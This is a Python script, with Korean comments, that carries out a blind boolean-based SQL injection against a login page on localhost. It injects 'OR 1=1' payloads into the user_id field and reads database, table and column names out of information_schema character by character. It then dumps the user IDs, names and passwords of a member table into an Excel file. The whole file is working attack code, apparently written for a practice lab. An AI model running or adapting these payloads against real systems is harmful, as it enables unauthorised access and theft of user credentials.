import requests	# post(),status_code 사용하기 위해
import pandas as pd

# SQL Injection을 사용할 url 입력
url = "http://localhost/login_ok.php"	
# Request에서 전달되는 파라미터를 딕셔너리형 변수로 저장
requestData = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
# 사이트에 가입 후 가입한 아이디를 입력 받을 변수
selId = input("ID 입력 : ")

checkCount = "select count(*) from information_schema.schemata"

checkName = "select schema_name from information_schema.schemata limit 4,1"

checkTableCount = "select count(*) from information_schema.tables where table_schema = 'user'"

checkColumnCount = "select count(*) from information_schema.columns where table_schema = 'user' and table_name = 'member'"

checkDataCount = "select count(*) from member"
def testSql():
    checkSql =["' OR 1=1 #", "' OR 1=2 #"]
    checkArr = [0, 0]
    for i in range(0,2):
        requestData["user_id"] = checkSql[i]
        req = requests.post(url, data=requestData)
        print(req.text)
        if req.status_code == 200:
            if "Wrong ID or PW." not in req.text:
                checkArr[i] = True
            else:
                checkArr[i] = False

    print(checkSql[0],checkArr[0])
    print(checkSql[1],checkArr[1])
    if checkArr[0] != checkArr[1]:
        print("There's weak point in this page.")

def getCount(input):
    count = 0
    while(True):
        count += 1
        data = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
        query = f"' or 1=1 and ({input}) = {count} #"
        data['user_id'] = query
        req = requests.post(url, data=data)
        if req.status_code == 200:
            if "Wrong ID or PW." not in req.text:
                break
            else:
                continue
    print("Count : " + chr(count))
    return int(count)

def isNotEnd(index,query):
    data = {'user_id': 'admin', 'user_pw' : '', 'Submit' : 'Login'}
    query = f"' or 1=1 and ascii(substr(({query}),{index},1)) = 0 #"
    data['user_id'] = query
    req = requests.post(url, data=data)
    return "Wrong ID or PW." in req.text

def SQLi_Information_Schema():
    print("\nTrying to get DB Name")
    guessed_name = ""
    index = 1
    target = 97
    count = 1
    start = 0
    end = 1
    checkDBName = f"select schema_name from information_schema.schemata limit {start},{end}"
    data = f"' or 1=1 and ascii(substr(({checkDBName}),{index},1)) = {target} #"
    requestData["user_id"] = data
    print("Trying to get information schema...")
    for i in range(getCount(checkCount)) :
        start = i
        index = 1
        target = 95
        checkDBName = f"select schema_name from information_schema.schemata limit {start},1"
        while (isNotEnd(index, checkDBName)):
            count += 1
            requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkDBName}),{index},1)) = {target} #"
            req = requests.post(url, data=requestData)
            if req.status_code == 200:
                if "Wrong ID or PW." not in req.text:
                    guessed_name += chr(target)
                    index += 1
                    target = 95
                else:
                    target += 1
        print(str(start + 1) +"th DB Name: " + guessed_name + '\n')
        guessed_name = ""
    print(f"{count}th working")

def SQLi_get_Table_Name():
    guessed_name = ""
    index = 1
    target = 97
    count = 1
    start = 0
    end = 1
    checkTableName = f"select table_name from information_schema.tables where table_schema = 'user' limit {start},{end}"
    data = f"' or 1=1 and ascii(substr(({checkTableName}),{index},1)) = {target} #"
    requestData["user_id"] = data
    print("Trying to get name of tables...")
    for i in range(getCount(checkTableCount)) :
        start = i
        index = 1
        target = 95
        checkTableName = f"select table_name from information_schema.tables where table_schema = 'user' limit {start},{end}"
        while (isNotEnd(index, checkTableName)):
            count += 1
            requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkTableName}),{index},1)) = {target} #"
            req = requests.post(url, data=requestData)
            if req.status_code == 200:
                if "Wrong ID or PW." not in req.text:
                    guessed_name += chr(target)
                    index += 1
                    target = 95
                else:
                    target += 1
        print(str(start + 1) +"th table Name: " + guessed_name + '\n')
        guessed_name = ""
    print(f"{count}th working")

def SQLi_get_Column_Name():
    guessed_name = ""
    index = 1
    target = 97
    count = 1
    start = 0
    checkColumname = f"select column_name from information_schema.columns where table_schema = 'user' and table_name = 'member' limit {start},1"
    data = f"' or 1=1 and ascii(substr(({checkColumname}),{index},1)) = {target} #"
    requestData["user_id"] = data
    print("Trying to get name of columns...")
    for i in range(getCount(checkColumnCount)) :
        start = i
        index = 1
        target = 95
        checkColumname = f"select column_name from information_schema.columns where table_schema = 'user' and table_name = 'member' limit {start},1"
        while (isNotEnd(index, checkColumname)):
            count += 1
            requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkColumname}),{index},1)) = {target} #"
            req = requests.post(url, data=requestData)
            if req.status_code == 200:
                if "Wrong ID or PW." not in req.text:
                    guessed_name += chr(target)
                    index += 1
                    target = 95
                else:
                    target += 1
        print(str(start + 1) +"th table Name: " + guessed_name + '\n')
        guessed_name = ""
    print(f"{count}th working")

def SQLi_get_User_Data(columnName):
    memberDataRow = []
    guessed_name = ""
    index = 1
    target = 48
    count = 1
    start = 0
    checkValue = f"select {columnName} from member limit {start},1"
    data = f"' or 1=1 and ascii(substr(({checkValue}),{index},1)) = {target} #"
    requestData["user_id"] = data
    print("Trying to get user data...")
    for i in range(getCount(checkDataCount)) :
        start = i
        index = 1
        target = 32
        checkValue = f"select {columnName} from member limit {start},1"
        while (isNotEnd(index, checkValue)):
            count += 1
            requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkValue}),{index},1)) = {target} #"
            req = requests.post(url, data=requestData)
            if req.status_code == 200:
                if "Wrong ID or PW." not in req.text:
                    guessed_name += chr(target)
                    index += 1
                    target = 32
                else:
                    target += 1
        print(str(start + 1) +f"th {columnName}: " + guessed_name + '\n')
        memberDataRow.append(guessed_name)
        guessed_name = ""
    print(f"{count}th working")
    return memberDataRow

def SQLi_get_User_Data_Binary(columnName):
    memberDataRow = []
    guessed_name = ""
    count = 1
    print("Trying to get user data...")
    print(getCount(checkDataCount))
    for i in range(getCount(checkDataCount)) :
        memberIndex = i
        charIndex = 1
        checkValue = f"select {columnName} from member limit {memberIndex},1"
        while(isNotEnd(charIndex, checkValue)):
            asciiStart = 32
            asciiEnd = 122
            checkValue = f"select {columnName} from member limit {memberIndex},1"
            while (asciiStart <= asciiEnd):
                count += 1
                mid = (asciiEnd + asciiStart) // 2
                requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkValue}),{charIndex},1)) = {mid} #"
                req = requests.post(url, data=requestData)
                if req.status_code == 200:
                    if "Wrong ID or PW." not in req.text:
                        guessed_name += chr(mid)
                        charIndex += 1
                        asciiStart = 32
                    else:
                        requestData["user_id"] = f"' or 1=1 and ascii(substr(({checkValue}), {charIndex}, 1)) > {mid} #"
                        req2 = requests.post(url, data=requestData)
                        if "Wrong ID or PW." not in req2.text:
                            asciiStart = mid + 1
                        else:
                            asciiEnd = mid - 1
        print(str(i + 1) +f"th {columnName}: " + guessed_name + '\n')
        memberDataRow.append(guessed_name)
        guessed_name = ""
    print(f"{count}th working")
    return memberDataRow

def SQLi_Extract_To_File():
    data = {}
    data['user_id'] = SQLi_get_User_Data_Binary('user_id')
    data['user_name'] = SQLi_get_User_Data_Binary('user_name')
    data['user_pw'] = SQLi_get_User_Data_Binary('user_pw')

    df = pd.DataFrame(data)

    df.to_excel("data.xlsx")

def main():
    #print("checking possibility of SQLi...")
    #testSql()

    #print("\nStart getting number of databases..")
    #getCount(checkCount)
    #SQLi_Information_Schema()
    
    #print("\nStart getting number of user tables..")
    #getCount(checkTableCount)

    #print("\nStart getting name of table in user")
    #SQLi_get_Table_Name()

    #print("\nStart getting name of column in member")
    #SQLi_get_Column_Name()

    print("\nGetting information from member.. ")
    SQLi_Extract_To_File()

        
if __name__ == "__main__":
    main()

